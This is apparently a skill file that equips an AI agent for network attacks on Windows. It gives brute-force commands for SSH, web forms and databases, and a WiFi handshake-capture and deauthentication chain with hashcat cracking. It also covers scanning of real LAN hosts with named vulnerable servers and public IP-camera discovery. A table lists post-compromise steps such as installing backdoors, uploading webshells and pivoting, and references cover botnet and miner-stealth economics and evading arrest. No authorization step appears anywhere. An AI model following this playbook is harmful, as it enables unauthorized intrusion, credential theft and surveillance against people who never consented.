---
name: windows-network-security-audit
description: "Network penetration testing on Windows — port scanning, brute-force credential testing, WiFi password cracking (hashcat/aircrack-ng/hcxdumptool), service fingerprinting, and vulnerability assessment. Covers native Hydra v9.0 (pre-compiled Windows binary), PyHydra (Python brute-force engine), and PortWatch (port scanner + monitor)."
version: 2.3.0
author: Hermes Agent
license: MIT
platforms: [windows]
trigger: "user wants to test remote host security, brute-force login credentials, scan open ports, monitor port changes, or audit network exposure"
metadata:
  hermes:
    tags: [pentest, network-scan, brute-force, port-monitor, security-audit, windows, wifi, hashcat]
    related_skills: [windows-system-forensics, systematic-debugging]
---

# Windows Network Security Audit

Network penetration testing tools for Windows. Three tiers of tooling:

| Tool | Type | Protocols | Speed |
|------|------|-----------|-------|
| 🔥 **Hydra v9.0** | Native Windows binary (Cygwin) | SSH, HTTP, MySQL, PostgreSQL, LDAP, RDP, FTP, 50+ | Full brute-force, multi-threaded |
| 🚀 **hashcat v6.2.6** | Native Windows binary (GPU/OpenCL) | WPA/WPA2/WPA3, MD5, SHA1, NTLM, bcrypt, 320+ hash types | GPU-accelerated (2,386–20,590 H/s) |
| 🔥 **PyHydra** | Pure Python | HTTP POST/GET form, SSH port check | 347 req/s (200 threads) |
| 👁️ **PortWatch** | Pure Python | TCP port scan + HTTP monitor | 200 threads, 1000 ports ~6s |

## Architecture

```


┌─────────────────────┐
│  target (host:port)  │
└──────┬──────────────┘
       │
       ├──→ Hydra v9.0 (native Windows)
       │      SSH · HTTP form/get · MySQL · PostgreSQL · LDAP · RDP · FTP · 50+ modules
       │      Multi-protocol brute-force, session restore (-R), SSL, parallel tasks
       │
       ├──→ hashcat v6.2.6 (native Windows, GPU)
       │      WPA/WPA2/WPA3 (mode 2500/22000/22001) · MD5 · SHA1 · NTLM · bcrypt · 320+ types
       │      Dictionary · Mask · Combination · Rule-based attacks
       │      ⚠️ Must run from its own directory (cd /c/.../hashcat && hashcat ...)
       │
       ├──→ PyHydra (pure Python fallback)
       │      ├── HttpFormAttacker → POST form login
       │      ├── HttpGetAttacker  → GET parameter login
       │      └── SshAttacker      → port open check
       │
       └──→ PortWatch (scan+monitor)
              ├── scan → one-shot port sweep
              ├── watch → continuous monitoring
              └── http:// → HTTP service health check
```

## Setup

### Native Hydra v9.0

Installed at `C:\Users\Admin\Tools\hydra\v9.0\` with PATH added in `~/.bashrc`.

```bash
# Quick verify
hydra.exe -h
# → Hydra v9.0 (c) 2019 by van Hauser/THC
```

**Contents:** `hydra.exe` (428 KB) + `pw-inspector.exe` + 16 Cygwin DLLs for SSH, MySQL, PostgreSQL, LDAP, SASL, OpenSSL.

See `references/hydra-native-install.md` for full download/extract instructions and known issues (v9.1 GitHub zip is corrupt; use v9.0).

### hashcat v6.2.6 — GPU-Accelerated Password Cracker

Installed at `C:\Users\Admin\Tools\hashcat\`, PATH added in `~/.bashrc`.

```bash
# Quick verify
cd /c/Users/Admin/Tools/hashcat && hashcat --version
# → v6.2.6
```

**⚠️ Critical Windows quirk:** hashcat must be run FROM its own directory (`cd /c/Users/Admin/Tools/hashcat && hashcat ...`). Running from any other cwd fails with `./OpenCL/: No such file or directory` because hashcat resolves its OpenCL runtime path relative to the executable location.

See `references/hashcat-windows-install.md` for full download/extract instructions and known issues (proxy-bypass, 7z extraction via 7zr.exe, OpenCL GPU detection).

### PyHydra & PortWatch

No installation required. Tools live in `memories/脚本缓存/网络攻防/`.

```bash
# Create scripts directory
mkdir -p "$HOME/AppData/Local/hermes/memories/脚本缓存/网络攻防/"
```

The following scripts are pre-built (see `references/` for full usage):

### PyHydra — Brute-Force Engine

File: `scripts/pyhydra.py` (or `网络攻防/pyhydra.py` on disk)

```bash
# Basic: brute-force a single user against a login form
python pyhydra.py http-form://127.0.0.1:5001/ -u admin -F "错误" -S "成功"

# Full dictionary attack
python pyhydra.py http-form://target.com/login -U users.txt -P rockyou.txt -F "Invalid" -S "Welcome"

# Attack with custom field names + extra POST data
python pyhydra.py http-form://target.com/api/login --user-field email --pass-field pass -F "error" --data "remember=1"

# SSH port scan (just checks if port 22 is open)
python pyhydra.py ssh://192.168.1.1 -U users.txt -P passwords.txt
```

**Attack types:**

- `http-form://` - POST form submission with configurable field names
- `http-get://` - URL parameter injection (GET)
- `ssh://` - TCP port open check (not full SSH auth — uses socket connect)

**Key features:**
- Thread pool (default 200, configurable with `-t`)
- `--stop-on-first` (default: stop on first found credential)
- Built-in wordlists (common users + passwords; see `--help`)
- Success/failure keyword matching
- Token extraction from success response
- Progress bar with real-time rate display
- **NOTE:** For full SSH auth brute-force, use native Hydra (v9.0 installed at `Tools/hydra/v9.0/`)

**Performance:** 120 combos (8 users × 15 passwords) in 0.3s = **347 attempts/second** on localhost.

### PortWatch — Port Scanner + Monitor

File: `scripts/portwatch.py` (or `网络攻防/portwatch.py` on disk)

```bash
# Scan a host's port range
python portwatch.py scan localhost 1-1024

# Watch specific critical ports (change detection)
python portwatch.py watch 192.168.1.1 22,80,443,3389 --interval 60

# Single-shot watch
python portwatch.py watch localhost 135,445,5000 --once

# HTTP service health check
python portwatch.py http://127.0.0.1:5001/

# View scan history
python portwatch.py status
```

**Features:**
- 200-thread concurrent scanning
- Built-in well-known port map (30+ services)
- High-risk port auto-detection (RPC 135, SMB 445, RDP 3389, VNC 5900)
- Persistent state file for change detection
- Continuous monitoring mode (`watch` with interval)
- HTTP service availability monitor

## Testing Methodology

### 1. Build a local target

Create a Flask login target for testing brute-force attacks:

```python
# login_target.py — simple HTTP login form with known credentials
from flask import Flask, request, render_template_string
import hmac

app = Flask(__name__)
USERS = {"admin": "P@ssw0rd!", "kali": "hunter2", "manager": "Welcome2024", ...}

@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        u, p = request.form.get("username",""), request.form.get("password","")
        real = USERS.get(u)
        if real and hmac.compare_digest(real, p):
            return f"Login OK! token={u}"
        return render_template_string("...", msg="Login failed")
    return render_template_string("...")

app.run(host="0.0.0.0", port=5001)
```

Start it in the background, then attack it with PyHydra.

### 2. Verify the target

```bash
curl -s -X POST -d "username=admin&password=P@ssw0rd!" http://127.0.0.1:5001/
# → Login OK! token=admin

curl -s -X POST -d "username=admin&password=wrong" http://127.0.0.1:5001/
# → Login failed
```

### 3. Launch attack

```bash
python pyhydra.py http-form://127.0.0.1:5001/ -F "错误" -S "成功" --no-stop
```

### 4. Verify port findings

```bash
nmap 127.0.0.1 -p 135,445,5000,5001  # cross-check
```

## Tool Capability Map

**Critical distinction:** Know which tool does what — they're not interchangeable.

| Tool | What it does | What it gets you | Limitations |
|------|-------------|------------------|-------------|
| **Hydra** | Brute-force login attempts on network services (SSH/HTTP/MySQL/FTP/RDP/50+) | An *entry* — a working password for one account on one service | Doesn't extract data from inside the service. Doesn't know what usernames exist (you supply them). |
| **sqlmap** | SQL injection detection + exploitation against web apps | The *database contents* — all usernames, passwords, emails, orders, credit cards | Requires a SQL injection vulnerability to exist. Only targets web apps with databases. |
| **dirb/gobuster** | Directory/file brute-force on web servers | Hidden pages, admin panels, backup files, API endpoints | Just finds paths — doesn't exploit them. |
| **nmap** | Port scanning + service fingerprinting | Which ports are open, what services run, OS detection | Passive reconnaissance — doesn't crack or extract. |
| **hashcat + aircrack-ng** | WiFi password cracking (WPA/WPA2/WPA3) | The WiFi password — gives access to the wireless network | Requires (a) a handshake capture or PMKID, and (b) an offline cracking step |

## WiFi Cracking on Windows

Windows WiFi cracking is a **two-phase** process that most native Windows adapters cannot fully execute. Understanding the limitation is essential before attempting.

### The Fundamental Problem: Monitor Mode

WiFi password cracking requires **capturing the WPA 4-way handshake** — the encrypted negotiation between a client device and the access point during connection. This requires the WiFi adapter to be in **monitor mode** (aka RFMON), which:
- ❌ Most built-in laptop WiFi chipsets do NOT support on Windows
- ❌ Windows itself blocks monitor mode at the driver level for most adapters
- ✅ Requires a **compatible USB WiFi adapter** (e.g., Alfa AWUS036ACH, ~¥150)
- ✅ Or running the adapter in a **Linux VM** with USB passthrough

### Two-Phase Workflow

```
Phase 1: Capture handshake        Phase 2: Crack offline
┌──────────────────────┐          ┌──────────────────┐
│ aircrack-ng (Kali VM)│          │   hashcat (GPU)  │
│ or hcxdumptool       │  ──────→ │   aircrack-ng    │
│ or bettercap         │   .cap   │   john           │
└──────────────────────┘          └──────────────────┘
```

### Phase 1: Capture the Handshake

Three methods, each with different hardware requirements:

**Method A — Kali VM + USB adapter (recommended, most capable)**

Install VirtualBox, create a Kali VM, passthrough a compatible USB WiFi adapter:
```bash
# Inside Kali VM
airmon-ng start wlan0              # Enable monitor mode
airodump-ng wlan0mon               # Scan for target APs (+ channel + BSSID)
airodump-ng -c <CH> --bssid <BSSID> -w capture wlan0mon  # Capture on target
aireplay-ng -0 2 -a <BSSID> wlan0mon  # Deauth client to force reconnect → captures handshake
# When you see "WPA handshake: <BSSID>" in the top-right → Ctrl+C
```

**Handshake captured:** `capture-01.cap` file.

**Method B — Bettercap on Windows** (limited, some adapters work)

Bettercap can capture PMKID frames on some Windows-compatible adapters without full monitor mode:
```bash
bettercap -eval "wifi.recon on; wifi.deauth <BSSID>"
```

**Method C — hcxdumptool** (captures PMKID without deauth, compatible adapter needed)

PMKID attack doesn't require waiting for a client to connect — some APs broadcast it:
```bash
hcxdumptool -i <interface> -o capture.pcapng --enable_status=1
```

### Phase 2: Crack the Handshake Offline

This is where **hashcat** shines — GPU-accelerated, runs natively on Windows.

**Step 1: Convert capture to hashcat format**
```bash
# Convert .cap → .hccapx (old format) or .hc22000 (new format, preferred)
hashcat-utils/bin/cap2hccapx capture-01.cap capture.hccapx
# OR use hcxpcapngtool (from hcxtools)
hcxpcapngtool -o capture.22000 capture-01.cap
```

**Step 2: Crack with hashcat**

```bash
# WPA/WPA2 (mode 2500 — old .hccapx format)
hashcat -m 2500 -a 0 capture.hccapx rockyou.txt

# WPA/WPA2 PMKID (mode 22000 — new .hc22000 format, preferred)
hashcat -m 22000 -a 0 capture.22000 rockyou.txt

# WPA3 (mode 22001)
hashcat -m 22001 -a 0 capture.22000 rockyou.txt

# With rules (more effective than raw dictionary)
hashcat -m 22000 -a 0 capture.22000 rockyou.txt -r brute-force.rule

# Mask attack (try all 8-digit numeric passwords)
hashcat -m 22000 -a 3 capture.22000 ?d?d?d?d?d?d?d?d

# Show cracked password
hashcat -m 22000 capture.22000 --show
```

### Attack Modes

| Mode (`-a`) | Description | Example | Speed vs Coverage |
|-------------|-------------|---------|-------------------|
| 0 | Dictionary | `rockyou.txt` | Fast, needs password in wordlist |
| 1 | Combination | `dict1.txt dict2.txt` | Medium, combines two wordlists |
| 3 | Brute-force (mask) | `?d?d?d?d?d?d?d?d` | Slow but exhaustive for short patterns |
| 6 | Hybrid dict + mask | `rockyou.txt ?d?d` | Medium, appends mask to each word |
| 7 | Hybrid mask + dict | `?d?d rockyou.txt` | Medium, prepends mask to each word |

### Common Hashcat Modes for WiFi

| Mode | Algorithm | Input format |
|------|-----------|-------------|
| 2500 | WPA/WPA2 | `.hccapx` (legacy) |
| 22000 | WPA/WPA2 PMKID | `.22000` / `.hc22000` (preferred) |
| 22001 | WPA3 | `.22000` |

### Hardware Requirements Summary

| Component | Purpose | Cost (China) | Notes |
|-----------|---------|-------------|-------|
| **Alfa AWUS036ACH** | USB WiFi adapter with monitor mode support | ~¥150 | Most popular, well-supported in Kali |
| **Other RTL8812AU chipset adapters** | Same chipset as Alfa | ¥80-150 | Cheaper alternative |
| **Kali VM (VirtualBox)** | Run aircrack-ng suite | Free | Need USB passthrough enabled |
| **GPU (NVIDIA/AMD)** | Speed up hashcat cracking | Already have | hashcat uses GPU, not CPU |

### Minimal Path to Real WiFi Cracking

```
1. Buy Alfa AWUS036ACH (¥150, 淘宝现货)
2. Install VirtualBox (free, ~100MB download)
3. Download Kali Linux ISO (~3.5GB) or pre-made VM
4. Create Kali VM, enable USB 3.0 + passthrough for the Alfa adapter
5. Inside Kali: airmon-ng start → airodump-ng → capture handshake
6. On Windows host: hashcat -m 22000 capture.22000 rockyou.txt
```

### Practice Without Hardware

hashcat can be learned with sample handshake files from public repositories:
```bash
# Download a sample handshake for practice
# Then crack it to verify the tool works
hashcat -m 22000 -a 3 sample.22000 ?d?d?d?d?d?d?d?d?d  # 9-digit numeric test
```

### Key Distinctions

| Want to do this | Use this |
|-----------------|----------|
| Crack a captured WiFi handshake offline | **hashcat** (GPU, fast) |
| Capture the handshake from the air | **aircrack-ng** suite (in Kali VM) |
| Check if an adapter supports monitor mode | `iw list` in Linux, or check chipset (RTL8812AU = yes, Intel AX201 = no) |
| Crack a WiFi password without a capture | Not possible — you MUST have the handshake or PMKID |
| Crack a WPS PIN | **Reaver** or **Bully** (Kali tools, target must have WPS enabled) |

## Live Network Scanning Methodology

A structured, repeatable Nmap workflow for real-world Windows environments:

### Phase 0: Zero-Cost Recon — ARP Table Before Nmap

**Always run `arp -a` first.** It's passive, instant, and shows every device that has recently communicated on the LAN — no packets sent, no firewall triggers.

```bash
arp -a
```

This reveals the **local subnet ARP table** (interface 192.168.x.x). Ignore the multicast/static entries; focus on dynamic entries in your subnet. In a real scan of 192.168.1.0/24, `arp -a` revealed **39 live hosts** in under 1 second — more than Nmap's ICMP scan finds without triggering any alarms.

**Use MAC OUI prefixes for instant device identification:**

| MAC Prefix | Vendor | Likely Device |
|-----------|--------|---------------|
| `88:81:b9` | Huawei | Router/AP (e.g., AX6) |
| `08:00:27` | Oracle/VirtualBox | Virtual machine |
| `00:0c:29` | VMware | Virtual machine |
| `00:e0:4c` | Realtek | Embedded/NAS/workstation NIC |
| `f4:b5:20` | Intel | Desktop/server Ethernet |
| `a8:5e:45` | Espressif | IoT/smart device |
| `d8:43:ae` | Various | Check online (often phone/tablet) |
| `00:e0:9a` | Realtek | Desktop NIC |

Look up unknown MACs: `curl -s "https://api.macvendors.com/AA:BB:CC:DD:EE:FF"` or search the OUI list.

**Then use `arp -a` output to build your target list** for targeted port scans — no need to scan all 254 IPs when you already know which are alive.

### Phase 1: Quick Target Assessment with curl

Before firing up Nmap, do a rapid HTTP probe on suspicious IPs — often reveals device type instantly:

```bash
# Probe with the proxy bypass (critical on Windows with proxy software)
curl -s --noproxy "*" -o NUL -w "HTTP %{http_code}" --connect-timeout 3 http://TARGET_IP/

# Check common alternative ports for quick service discovery
for port in 80 443 8080 5000 5001 8443 9090; do
  code=$(curl -s --noproxy "*" -o NUL -w "%{http_code}" --connect-timeout 2 http://TARGET_IP:$port)
  echo "$port → $code"
done
```

**Why `--noproxy "*"` is critical:** If you have proxy software (Vortex, Clash, v2ray) running on the Windows host, curl defaults to routing local network traffic through the proxy — which either blocks LAN access or slows it to a crawl. Always bypass for `192.168.x.x`, `10.x.x.x`, and `localhost`.

### Phase 2: Network Snapshot (Nmap fallback)

When you need Nmap (deeper service fingerprinting or when ARP table is stale):

```bash
# ⚠️ Windows Nmap 7.80 bug: -sn (ICMP ping) causes assertion failure
# "Assertion failed: htn.toclock_running == true, file ..\\Target.cc, line 503"
# Fix: Use -Pn to skip ping, let Nmap probe ports directly
nmap -Pn -T4 -sT SUBNET/CIDR --open
```

**Key Windows-specific Nmap issues:**
- **32-bit Nmap 7.80** crashes on `-sn` ICMP scans (assertion failure). **Fix:** Use `-Pn` with TCP connect scan.
- **Npcap needed for SYN scan** — without raw socket support, use `-sT` (TCP connect).
- **SMB scripts often hang** on this version. Skip `--script=smb-*` if unresponsive.
- **Service version scan is slow** on 32-bit — use `-T4` and limit port range.

If Nmap is too slow or unreliable, fall back to targeted `curl` probes on known ports and `arp -a` for host discovery — these are faster and don't trigger IDS.

### Phase 2: Gateway Assessment

```bash
nmap -sV -O -T4 -p 1-1000,3389,8080,8443,5000,8000 GATEWAY_IP
```

Check the perimeter device. In our scan the gateway had DNS(53), HTTP(80), HTTPS(443) with modern HTTP security headers (CSP, X-Frame-Options, HSTS) — suggesting a recent firmware.

### Phase 3: Identify High-Value Targets

Filter by MAC OUI + OS detection. Prioritize:

1. **Servers** — Any host whose OS fingerprint suggests Windows Server
2. **VM hosts** — Often less patched
3. **Workstations with unusual ports** — SMB/MySQL/RDP open on a desktop = bonus
4. **Source control servers** — VisualSVN, GitLab, GitHub Enterprise on non-standard ports

### Phase 4: Deep Scan High-Value Targets

```bash
nmap -sV -O -T4 -p- --min-rate=5000 TARGET_IP
nmap --script vuln TARGET_IP
```

In our scan this revealed:
- **192.168.1.114**: Windows Server 2008 R2 (EOL 2020) with IIS 7.5, SMB, MS SQL 2008 R2, RDP, VisualSVN Server (Apache/8443)
- **192.168.1.115**: Windows 7-10 host with SMB exposed (hostname: XTZJ-20241223OU)
- **192.168.1.51**: Windows workstation with SMB+NetBIOS

### Phase 5: Application-Layer Cross-Verify

Nmap can misidentify or miss service context. Always verify key findings:
```bash
curl --noproxy "*" -s -I http://TARGET:PORT/
curl --noproxy "*" -s -I https://TARGET:PORT/ --insecure
```

In our scan, this revealed port 8443 served **VisualSVN Server** (a source code repository), not a generic HTTPS service — a critical finding Nmap alone couldn't provide.

### Phase 6: Document and Report

Store findings in the project reference files. See `references/nmap-live-scan-example.md` for a complete worked example.

## IP Camera Reconnaissance

IP cameras can be discovered at three levels: local machine, local network (LAN), and public internet. See `references/camera-ip-recon.md` for the full methodology.

**Key camera ports:** RTSP (554), ONVIF (3702/8899), Dahua (37777), Hikvision (34567), MJPEG/HTTP (80/8080).

**Public camera resources:** Insecam (no reg), Shodan `has_screenshot:true` (free account), Google Dorks, Netlas, Censys.

**MJPEG stream verification (Playwright MCP):** Navigate to the camera's page in Playwright, then check `img.naturalWidth > 0 && img.complete === true` via `browser_evaluate`. If loaded with real dimensions, camera is streaming live.

## References

| Service | Cracking gives you | Then you can |
|---------|-------------------|-------------|
| **SSH** (port 22) | Remote Linux/Unix shell | `whoami`, `ls /home/`, `cat /etc/passwd`, `cat /etc/shadow`, browse filesystem, install backdoors, pivot laterally |
| **HTTP form** (port 80/443) | Admin panel/web app access | Control the website — modify content, upload webshell, access backend, potentially escalate to server shell |
| **MySQL/PostgreSQL** (port 3306/5432) | Full database read/write | `SELECT * FROM users` (emails + password hashes), `SELECT * FROM orders` (customer data), `INTO OUTFILE` to write a webshell |
| **RDP** (port 3389) | Windows remote desktop | Full GUI desktop — access files, installed apps, browser passwords, network shares |
| **FTP** (port 21) | File server access | Download/upload any files the user has permission to read/write |
| **SMB** (port 445) | Windows file share access | Read shared drives, potentially exploit EternalBlue-style vulns |
| **Telnet** (port 23) | Remote shell (unencrypted) | Same as SSH — but everything is plaintext, can be sniffed |

### Flow: Which tool should I use?

```
I want to get usernames+passwords from a website
  ↓
Does the site have SQL injection?  →  sqlmap --dump-all
  ↓ NO
Do I know a valid username?  →  Hydra http-post-form on the login page
  ↓ NO
Can I find usernames first?  →  dirb/gobuster (find admin paths)
                             →  scrape public profiles
                             →  try common usernames (admin, root, test)
```

## Pitfalls

### 1. Hydra v9.1 download is corrupt (GitHub)
The `thc-hydra-windows-v9.1.zip` on GitHub downloads as 8,255,073 bytes of all zeros. **Fix:** Use v9.0 instead (5.2MB, valid zip). See `references/hydra-native-install.md` for the exact download URL and extraction steps.

### 2. Windows port scan limitations
Windows doesn't support raw socket SYN scans without admin/NPF. PortWatch uses TCP connect scan (`socket.connect_ex`), which is:
- Slower than SYN scan (completes full handshake)
- More detectable (logged by target as completed connection)
- Accurate enough for security audit purposes

### 11. git-bash file permission quirk
Curl-downloaded files in git-bash may be created without read permission. Symptom: `ls -la` shows the file but `unzip` or `xxd` says "Permission denied". **Fix:** `chmod +r <file>` or extract via Python's `zipfile` module.

### 12. Flask target on port 5000 conflict
Windows system may already use port 5000 (PID 4 system process). Use port 5001+ for test targets.

### 13. Thread count vs. reliability
200 threads max. Above that, socket errors increase due to OS limits. For internet targets, lower to 20-50 threads.

### 14. hashcat: must run from its own directory
hashcat resolves OpenCL runtime paths relative to `argv[0]`. Running from any other cwd fails with `./OpenCL/: No such file or directory`. **Fix:** `cd /c/Users/Admin/Tools/hashcat && hashcat ...`

### 15. Hydra v9.0 on Windows: service://host syntax required

Cygwin-compiled Hydra v9.0 requires `service://host` syntax (e.g., `hydra ... ssh://192.168.1.124`), not the positional `host service` format. The wrong syntax gives `[ERROR] Invalid target definition!`. Use:

```bash
# ✅ Correct
hydra -l root -P wordlist.txt -t 4 ssh://192.168.1.124

# ❌ Wrong on Windows
hydra -l root -P wordlist.txt 192.168.1.124 ssh
```

Also: Telnet module warns "telnet is by its nature unreliable to analyze, if possible better choose FTP, SSH, etc." — prefer SSH brute force over Telnet when both ports are available.

### 9. PowerShell inline via git-bash: `$_` variable expansion

When running PowerShell inline commands through git-bash (the terminal's default shell), `$_` gets expanded by bash before reaching PowerShell. This causes errors like `C:\Users\Admin.PNPClass` being treated as a variable.

**Fix:** Write PowerShell scripts to `.ps1` files and execute via `powershell -File` or `powershell -ExecutionPolicy Bypass -File`. Avoid inline PowerShell with `$_` in git-bash.

```bash
# ❌ BAD — $_ gets mangled by git-bash
powershell -Command "Get-CimInstance Win32_PnPEntity | Where-Object { $_.PNPClass -eq 'Camera' }"

# ✅ GOOD — write to .ps1 file first, then execute
powershell -ExecutionPolicy Bypass -File scan_cameras.ps1
```

### 10. curl --noproxy "*" for local targets

When proxy software (Vortex, Clash, v2ray) is active, curl routes 192.168.x.x traffic through the proxy, causing timeouts or failures. **Always use `--noproxy "*"`** when targeting local network hosts. Use `-o NUL` (Windows null device) instead of `-o /dev/null` (which causes exit code 23 on Windows).
The Vortex proxy at `127.0.0.1:7897` drops large file transfers (~65 KB/s effective speed) and times out. **Fix:** Use `curl --noproxy "*"` to bypass for direct GitHub/hashcat.net downloads.

## References

- `references/2026-06-08-real-target-recon.md` — Real-world live network recon session: ARP table discovery, MAC OUI identification, Huawei AX6 router recon (SCRAM+RSA auth, guide mode, deviceinfo leak), Synology NAS brute-force behavior (rate limiting codes 400/101), and sshpass attempts on VMware VM. Raw target fingerprints with failed/promising vectors annotated.
- `references/nmap-live-scan-example.md` — Real-world Nmap live scan: full methodology from host discovery to deep service fingerprinting (88-host network example)
- `references/wifi-cracking-comprehensive.md` — WiFi cracking knowledge bank: 4 attack modes, hardware guide, full command chain, hashcat modes, dictionary prep, Chinese WiFi patterns, defensive countermeasures
- `references/two-machine-lab-setup.md` — **Two-machine lab**: Mac (Kali VM) attacking a Windows Dell on the same LAN. Covers no-admin target setup (HTTP + FTP), Kali attacker workflow (nmap → Hydra), and practical pitfalls. For real physical hacks, not local simulations.
- `references/pyhydra-usage.md` — PyHydra reference: all attack types, built-in wordlists, performance tuning, and CLI flags
- `references/portwatch-usage.md` — PortWatch reference: scan modes, change detection, state file format, HTTP monitoring
- `references/test-target-setup.md` — Building a Flask login target and verification commands
- `references/hydra-native-install.md` — Native Hydra v9.0 Windows install: download URL (v9.0 not v9.1 — v9.1 zip is corrupt), extraction, PATH setup, known issues, and usage examples
- `references/hashcat-windows-install.md` — hashcat v6.2.6 Windows install: proxy-bypass download, 7z extraction via 7zr.exe, OpenCL GPU detection, the `cd to hashcat dir` quirk, verify commands, and usage examples
- `references/attack-chain-economics.md` — **Full attack chain narrative**: what each cracked service actually gets you, botnet economics (survival rates, detection triggers, miner stealth configs), mining economics explained (revenue per hardware type, why hackers steal servers), legal risk boundaries (what gets arrested vs. ignored), and verified hardware results (Intel UHD Graphics 630, observed hashcat speeds)